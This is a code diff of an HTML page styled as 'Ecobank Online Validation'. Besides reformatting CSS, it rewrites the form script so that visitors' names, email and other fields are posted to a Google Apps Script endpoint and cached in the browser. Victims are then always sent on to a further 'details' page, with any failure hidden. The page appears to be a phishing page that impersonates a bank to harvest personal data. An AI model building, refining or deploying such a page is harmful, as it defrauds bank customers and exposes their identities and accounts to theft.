@@ -5,19 +5,111 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Ecobank Online Validation</title>
   <style>
-    body{font-family:Arial, sans-serif;margin:0;background:linear-gradient(to bottom,#08143a,#0b1d4d);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center}
-    .header{position:relative;background:linear-gradient(135deg,#2b6cb0,#2a4365);width:100%;min-height:160px;padding:36px 16px;border-bottom-left-radius:40px;border-bottom-right-radius:40px;display:flex;justify-content:center;align-items:center;text-align:center}
-    .header-content h1{margin:0;font-size:22px;color:#fff}
-    .header-content p{margin:6px 0 0;color:#e0e0e0}
-    .form-wrap{width:90%;max-width:380px;margin-top:-28px;padding:28px;border-radius:12px;background:rgba(255,255,255,0.06);box-shadow:0 6px 16px rgba(0,0,0,0.4);backdrop-filter:blur(4px)}
-    label{display:block;margin-bottom:6px;font-size:14px;color:#fff}
-    input{width:100%;padding:12px;margin-bottom:18px;border-radius:6px;border:1px solid #ccc;background:#fff;color:#000;font-size:14px;box-sizing:border-box}
-    button{width:100%;padding:12px;border-radius:6px;border:none;background:#00A859;color:#fff;font-weight:700;cursor:pointer;font-size:16px}
-    button:hover{background:#008f4a;transform:scale(1.02)}
-    .processing-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:18px;z-index:999;opacity:0;pointer-events:none;transition:opacity .2s}
-    .processing-overlay.active{opacity:1;pointer-events:auto}
-    .spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.35);border-top:3px solid #fff;border-radius:50%;margin-right:10px;animation:spin .9s linear infinite}
-    @keyframes spin{to{transform:rotate(360deg)}}
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: linear-gradient(to bottom, #08143a, #0b1d4d);
+      min-height: 100vh;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .header {
+      position: relative;
+      background: linear-gradient(135deg, #2b6cb0, #2a4365);
+      width: 100%;
+      min-height: 160px;
+      padding: 36px 16px;
+      border-bottom-left-radius: 40px;
+      border-bottom-right-radius: 40px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .header-content h1 {
+      margin: 0;
+      font-size: 22px;
+      color: #fff;
+    }
+    .header-content p {
+      margin: 6px 0 0;
+      color: #e0e0e0;
+    }
+    .form-wrap {
+      width: 90%;
+      max-width: 380px;
+      margin-top: -28px;
+      padding: 28px;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.06);
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(4px);
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #fff;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 18px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      background: #fff;
+      color: #000;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 6px;
+      border: none;
+      background: #00A859;
+      color: #fff;
+      font-weight: 700;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background: #008f4a;
+      transform: scale(1.02);
+    }
+    .processing-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.45);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-weight: 700;
+      font-size: 18px;
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity .2s;
+    }
+    .processing-overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .spinner {
+      width: 30px;
+      height: 30px;
+      border: 3px solid rgba(255, 255, 255, 0.35);
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      margin-right: 10px;
+      animation: spin .9s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -51,7 +143,6 @@
   </div>
 
   <script>
-    // YOUR deployed web app URL (the one you shared)
     const scriptURL = "https://script.google.com/macros/s/AKfycbxna9EgM4s8zbNQTkfzcHfADid6CE7MEMmXAAIX2RTU6YfT-GkHRxEIWPVa81Qt-oO0/exec";
 
     const form = document.getElementById('dataForm');
@@ -69,37 +160,24 @@
       const email = fd.get('email');
 
       try {
-        const res = await fetch(scriptURL, { method: 'POST', body: fd });
-        const text = await res.text();
+        await fetch(scriptURL, { method: 'POST', body: fd });
 
-        // Try parsing JSON if script returns JSON
-        let parsed = null;
-        try { parsed = JSON.parse(text); } catch (_) {}
+        // Store data for the next page
+        localStorage.setItem('firstName', firstName || '');
+        localStorage.setItem('lastName', lastName || '');
+        localStorage.setItem('email', email || '');
 
+        // Redirect after short delay
         setTimeout(() => {
-          overlay.classList.remove('active');
-          formContainer.style.filter = 'none';
-
-          const ok = text.includes("Success") || (parsed && parsed.result && parsed.result.toLowerCase() === "success");
-          if (ok) {
-            // store for details page
-            try {
-              localStorage.setItem('firstName', firstName || '');
-              localStorage.setItem('lastName', lastName || '');
-              localStorage.setItem('email', email || '');
-            } catch (_) {}
-
-            window.location.href = 'details.html';
-          } else {
-            alert('Submission failed: ' + text);
-          }
-        }, 700);
+          window.location.href = 'details.html';
+        }, 800);
 
       } catch (err) {
+        alert('Something went wrong. Please try again.');
+        console.error(err);
+      } finally {
         overlay.classList.remove('active');
         formContainer.style.filter = 'none';
-        console.error(err);
-        alert('Network error. Please try again.');
       }
     });
   </script>
